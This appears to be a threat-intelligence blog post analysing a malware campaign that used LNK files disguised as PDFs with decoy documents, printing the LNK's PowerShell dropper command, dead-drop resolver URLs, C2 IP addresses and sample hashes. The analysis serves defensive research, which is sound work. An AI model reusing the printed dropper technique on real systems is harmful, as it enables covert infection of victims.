INTRODUCTION
This post will discuss an ongoing campaign that have been operational since at least August 2017. The post will look into the
delivery of the malware, some analysis on the payload, and some additional insights in relation to the campaign. It is by no means
a full in depth analysis of the malware and all it's functionality.

LAWYER UP!!
This all started with a tweet by the AWESOME Jacob Soo (@_jsoo_) whom I recommend you go and follow if you are interested
in analyzing malware and tracking different threat actors.

The sample is a ZIP file titled "Dubai_Lawyers_update_2018.zip" and the archive contains two LNK files that are perpetrating to
be PDF files. The actors in this case borrowed couple of files from the British Embassy site and used them as decoy documents
to lure victims into believing that these files are in fact legitimate.

I took the time to analyze the sample and it seems that it does the following:

1/5

The LNK files contain BASE64 strings that once decoded will show some hard-coded URLs. We will get back to this in a
moment

hxxps://plus[.]google[.]com/u/0/collection/U84ZPF
LNK contains a small PowerShell script that creates a VBE file
"/c powershell -c "$m='Dubai.pdf.lnk';$t=[environment]::getenvironmentvariable('tmp');cp $m $t\$m;$z=$t+'\'+@(gci -name $t $m rec)[0];$a=gc $z|out-string;$q=$a[($a.length-2340)..$a.length];[io.file]::WriteAllbytes($t+'\.vbe',$q);CsCrIpT $t'\.vbe'"
VBE file once decoded is responsible for:
Creating the Decoy PDF document
Creating a PowerShell script from chunks of code within the original LNK file.
Running that PowerShell Code

The resulting PowerShell script is also obfuscated. Once decoded, the script, which is over 900 lines, which I am calling
POWERSING acts as the main payload and construct a dll to run the main functionality of the malware.

If we visit some of the URLs that are hard-coded within the LNK samples we will notice a recurring theme that all of them have a
string that look like this

The POWERSING code seems to instructs the victim machine to go to different hard-coded sites (Youtube, Twitter, Google+,
Wordpress, etc) looking for a specific string
"Yo bro i sing" + BASE64 encoded String + "My keyboard doesnt work.." + String of enocded/encrypted characters.
Based on this, I was able to find additional links and sites which are probably related to the same campaign.
1. Google Results - hxxps://www.google.com/search?
q=%22Yo+bro+i+sing%22+%2B+%22My+keyboard+doesnt+work..%22&filter=0&biw=1536&bih=723
2. Youtube Results - hxxps://www.youtube.com/results?
search_query=%22Yo+bro+i+sing%22+%2B+%22My+keyboard+doesnt+work..%22
3. Oldest Youtube Video with such code is from over a year ago - hxxps://www.youtube.com/watch?v=1jrvJD2uKjM
4. Twitter Results - hxxps://twitter.com/search?

6. Imgur - hxxps://imgur.com/t/ily/36tbM2J
The POWERSING code included a function (LongtoIP) that seems to take the Base64 chunk from the above string, decodes it
and run some mathmatical equations on it to produce the real C2.

Based on this, I was able to calculate 4 different potential C2 servers from the different comments and links I found
54.38.192[.]174 – Most recent, from around Mid Nov
91.229.76[.]153
105.104.10[.]115 – Oldest, from Aug 2017
52.67.106[.]251
The first two IP addresses seem to have shared the same SSL cert as shown below

UNCOVERING ADDITIONAL SAMPLES
I wanted to see if I can find additional samples that could be related to this campaign and after some more digging, I found a
couple of older samples going back to Nov 2017.
SAMPLE 1 - ITW name: p2_ecamos_Volatility_Strategy_2X[.]pdf.lnk
HASH - e91f0189ed04972ce71fd10631e8830c585908089a38a05a12bd4e43d6e21024
Current Detection – 0/59
SAMPLE 2 - ITW name: ecamos_Volatility_Strategy_2X[.]pdf.lnk
HASH - 0c7e8427ee61672568983e51bf03e0bcf6f2e9c01d2524d82677b20264b23a3f
Current Detection – 0/59
Ecamos seems to be an Investment company off of Switzerland (hxxps://www.ecamos[.]ch/en/)
The lure is taken from this most probably:
hxxps://www.ecamos[.]ch/downloads/ecamos%20Volatility%20Strategy%202X_factsheet_2018%20November.pdf
These samples had these hardcoded URLs:

ADDITIONAL INSIGHTS AND FINAL THOUGHTS
When I first started looking into this I reached out to few peers to get their insights and their expertise and I was not disappointed
as some of them provided valuable information:
CALCULATING THE C2
In relation to the function responsible for calculating the potential C2 IP addresses, we noticed that 2 values when divided by
(25835) does produce an integer and have a decimal point. Keeping in mind that based on the variable types identified in the
function, the calculated result will just drop the decimal point; we still wanted to look into potential divider that would produce an
integer.

Interestingly, these two IP addresses shared hosting an SSL certificate which even make the potential that this is related to the
same campaign even more as shown below

RE-INTRODUCING JANICAB
As I was writing this post, I was pointed toward a blogpost that talks about a malware called (Janicab) that shares a very similar,
almost identical TTP and the samples I found could be variants of such malware or using same functionality/code:

https://www.f-secure.com/weblog/archives/00002803.html
https://www.f-secure.com/weblog/archives/00002576.html
This is the first I actually hear of “Janicab” so I don’t have much info about it other than it seems to be cross platform (Mac and
Windows). The F-Secure posts above covers it in detail and provide more information about it's capabilities.

4/5

Running additional searches looking for ”Janicab” returns more samples that share more similarities with this campaign. If this is
indeed related to the Janicab family/operation, that shows that this malware/operation has been going on since at least 2013.
